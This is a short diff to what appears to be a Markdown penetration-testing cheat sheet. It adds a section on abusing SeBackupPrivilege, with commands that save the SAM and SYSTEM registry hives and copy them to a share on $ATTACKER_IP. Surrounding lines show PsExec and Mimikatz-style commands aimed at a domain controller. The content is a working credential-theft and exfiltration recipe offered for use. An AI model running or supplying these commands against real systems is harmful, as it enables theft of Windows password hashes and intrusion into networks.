@@ -327,6 +327,14 @@ misc::cmd
 PsExec.exe \\$DOMAIN_CONTROLLER cmd.exe
 ```
 
+Abuse SeBackupPrivilege
+---
+```poweshell
+reg save hklm\sam c:\Windows\Tasks\SAM
+reg save hklm\system c:\Windows\Tasks\SYSTEM
+copy c:\Windows\Tasks\SYSTEM \\$ATTACKER_IP\shared\SYSTEM
+copy c:\Windows\Tasks\SAM \\$ATTACKER_IP\shared\SAM
+```
 Volume Shadow Copy:
 ---
 #vshadow #ntds #system-bak
